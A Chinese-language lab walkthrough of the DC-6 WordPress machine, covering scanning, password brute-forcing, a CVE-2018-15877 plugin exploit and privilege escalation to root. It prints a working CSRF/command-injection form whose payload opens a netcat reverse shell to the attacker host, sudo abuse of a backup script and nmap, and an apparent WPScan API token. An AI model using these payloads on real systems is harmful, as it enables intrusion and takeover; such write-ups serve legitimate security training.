环境配置

```
192.168.0.102 wordy
```

并且，官方给了一个线索：`cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt`

```
graham:GSo7isUM1D4
```

# 信息搜集

1、端口扫描

```bash
└─# nmap -A -sVC -O -p- 192.168.0.141 -oA namp.txt 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e52cece01b694eb7b037dbe087f5ffd (RSA)
|   256 3c836571dd73d723f8830de346bcb56f (ECDSA)
|_  256 41899e85ae305be08fa4687106b415ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
MAC Address: 00:0C:29:CF:C5:D7 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2、发现 80 端口为 worldpress 站点，用 wpsan 扫描

```bash
└─# cat /root/.wpscan/scan.yml 
cli_options:
  api_token: L6qtLJk0swdg0XRMKX6eU5BJE6I0fbV52H8wFLcZKXY
```

简单扫描

```bash
└─# wpscan --url http://wordy/

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |


[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

```

枚举用户名

```bash
└─# wpscan --url http://wordy/ -eu


[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

顺便把用户名做成 账号字典

3、目录爆破

```bash
└─# dirb http://wordy/                                                                                                                                        5 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jun 30 23:56:11 2023
URL_BASE: http://wordy/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://wordy/ ----
+ http://wordy/index.php (CODE:301|SIZE:0)                                                                                                                       
+ http://wordy/server-status (CODE:403|SIZE:293)                                                                                                                 
==> DIRECTORY: http://wordy/wp-admin/                                                                                                                            
==> DIRECTORY: http://wordy/wp-content/                                                                                                                          
==> DIRECTORY: http://wordy/wp-includes/                                                                                                                         
+ http://wordy/xmlrpc.php (CODE:405|SIZE:42)                                                                                                                     
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-admin/ ----
+ http://wordy/wp-admin/admin.php (CODE:302|SIZE:0)                                                                                                              
==> DIRECTORY: http://wordy/wp-admin/css/                                                                                                                        
==> DIRECTORY: http://wordy/wp-admin/images/                                                                                                                     
==> DIRECTORY: http://wordy/wp-admin/includes/                                                                                                                   
+ http://wordy/wp-admin/index.php (CODE:302|SIZE:0)                                                                                                              
==> DIRECTORY: http://wordy/wp-admin/js/                                                                                                                         
==> DIRECTORY: http://wordy/wp-admin/maint/                                                                                                                      
==> DIRECTORY: http://wordy/wp-admin/network/                                                                                                                    
==> DIRECTORY: http://wordy/wp-admin/user/                                                                                                                       
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-content/ ----
+ http://wordy/wp-content/index.php (CODE:200|SIZE:0)                                                                                                            
==> DIRECTORY: http://wordy/wp-content/plugins/                                                                                                                  
==> DIRECTORY: http://wordy/wp-content/themes/                                                                                                                   
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-admin/network/ ----
+ http://wordy/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                                                      
+ http://wordy/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                                                      
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-admin/user/ ----
+ http://wordy/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                                                         
+ http://wordy/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                                                         
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-content/plugins/ ----
+ http://wordy/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                                                                    
                                                                                                                                                                 
---- Entering directory: http://wordy/wp-content/themes/ ----
+ http://wordy/wp-content/themes/index.php (CODE:200|SIZE:0)                                                                                                                                                                                                               
```

# web打点

## 枚举密码进wp后台

1、可以使用 wpscan 爆破密码

```bash
wpscan --url http://wordy/ -U usernames.txt -P passwords.txt

[SUCCESS] - mark / helpdesk01
```

也可以使用 burp 爆破

2、登录wp后台

不是高权限

<img src=".\图片\Snipaste_2023-07-01_12-11-04.png" alt="Snipaste_2023-07-01_12-11-04" style="zoom:80%;" />

但是发现了 插件 `Activity monitor`

## wp插件漏洞利用

1、寻找 `Activity monitor` 是否有已知漏洞

```bash
└─# searchsploit Activity monitor -m 45274
```

2、漏洞利用

修改其中的 目标url 与 kali 反弹 shell 的 ip 端口

如下：

```html
<!--
About:
===========
Component: Plainview Activity Monitor (Wordpress plugin)
Vulnerable version: 20161228 and possibly prior
Fixed version: 20180826
CVE-ID: CVE-2018-15877
CWE-ID: CWE-78
Author:
- LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre)

Timeline:
===========
- 2018/08/25: Vulnerability found
- 2018/08/25: CVE-ID request
- 2018/08/26: Reported to developer
- 2018/08/26: Fixed version
- 2018/08/26: Advisory published on GitHub
- 2018/08/26: Advisory sent to bugtraq mailing list

Description:
===========
Plainview Activity Monitor Wordpress plugin is vulnerable to OS
command injection which allows an attacker to remotely execute
commands on underlying system. Application passes unsafe user supplied
data to ip parameter into activities_overview.php.
Privileges are required in order to exploit this vulnerability, but
this plugin version is also vulnerable to CSRF attack and Reflected
XSS. Combined, these three vulnerabilities can lead to Remote Command
Execution just with an admin click on a malicious link.

References:
===========
https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/

PoC:
-->

<html>
  <!--  Wordpress Plainview Activity Monitor RCE
        [+] Version: 20161228 and possibly prior
        [+] Description: Combine OS Commanding and CSRF to get reverse shell
        [+] Author: LydA(c)ric LEFEBVRE
        [+] CVE-ID: CVE-2018-15877
        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
  -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc  192.168.0.103 1234 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>   
```

```bash
└─# nc -lvvp 1234              
listening on [any] 1234 ...
connect to [192.168.0.103] from wordy [192.168.0.141] 52454
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 提权

1、在`mark` 的家目录下找到了果然 `graham` 的密码

```bash
www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/thing*
cat /home/mark/stuff/thing*
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

```
graham:GSo7isUM1D4
```

2、su 到 graham 用户

```bash
www-data@dc-6:/var/www/html/wp-admin$ su graham
su graham
Password: GSo7isUM1D4

graham@dc-6:/var/www/html/wp-admin$ whoami
whoami
graham
```

3、查看 graham 用户 sudo 权限

```bash
graham@dc-6:/var/www/html/wp-admin$ sudo -l
sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

发现  `backups.sh`，我们能以 `jens`  用户的身份执行 backups.sh 脚本

```bash
graham@dc-6:/var/www/html/wp-admin$ ls -al /home/jens/
ls -al /home/jens/
total 28
-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh
```

```bash
graham@dc-6:/home/jens$ cat backups.sh
cat backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
```

4、切换权限到 jens 用户

写入/bin/bash，执行，切换到 jens 的 shell  `echo "/bin/bash" >> backups.sh` `sudo -u jens ./backups.sh`

```bash
raham@dc-6:/home/jens$ echo "/bin/bash" >> backups.sh
echo "/bin/bash" >> backups.sh
graham@dc-6:/home/jens$ sudo -u jens ./backups.sh
sudo -u jens ./backups.sh
tar: Removing leading `/' from member names
jens@dc-6:~$ whoami
whoami
jens
```

4、查看 jens 的 sudo 权限

```bash
jens@dc-6:~$ sudo -l
sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

于是 nmap 提权

```
echo "os.execute('/bin/bash')" > getshell
sudo nmap --script=getshell
```

<img src=".\图片\Snipaste_2023-07-01_12-32-07.png" alt="Snipaste_2023-07-01_12-32-07" style="zoom:80%;" />

# 总结

对 wp 站点的 插件提权有了了解，也知道了 这里 进wp后台的方式 可以是枚举用户名再字典爆破密码

提权时 注意 /home 目录里的信息，不能一步到 root 的话，要想办法先提权到 别的用户 ，再到 root ，这样曲折进行






